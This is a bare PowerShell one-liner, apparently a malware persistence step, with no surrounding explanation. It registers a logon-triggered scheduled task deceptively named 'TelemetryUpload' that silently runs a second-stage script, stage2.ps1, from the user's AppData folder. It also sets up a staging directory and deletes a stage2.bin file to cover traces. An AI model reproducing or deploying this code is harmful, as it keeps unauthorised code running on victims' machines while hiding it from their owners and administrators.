
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\stage2.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName "TelemetryUpload" -Action $TaskAction -Trigger $TaskTrigger -Force; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
